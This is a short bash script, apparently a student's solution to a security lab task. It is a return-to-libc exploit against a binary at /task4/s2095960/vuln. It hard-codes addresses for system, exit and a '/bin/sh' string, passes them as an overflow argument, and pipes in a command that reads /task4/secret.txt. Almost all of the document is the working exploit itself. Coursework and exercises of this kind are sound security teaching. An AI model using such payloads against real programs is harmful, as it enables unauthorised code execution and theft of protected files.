#!/usr/bin/env bash

SYSTEM='\x50\x81\xc4\xf7'

EXIT='\x40\xa4\xc3\xf7'

#BINBASH='\x69\xd7\xff\xff'

BINBASH='\xf5\xd0\xdb\xf7'

  

echo /bin/cat /task4/secret.txt | env -i SHELL=/bin/sh \

  /task4/s2095960/vuln $(echo -en "\xb0\x7c\xc4\xf7\xc0\xa1\xc3\xf7\xf5\x90\xdb\xf7") 1237
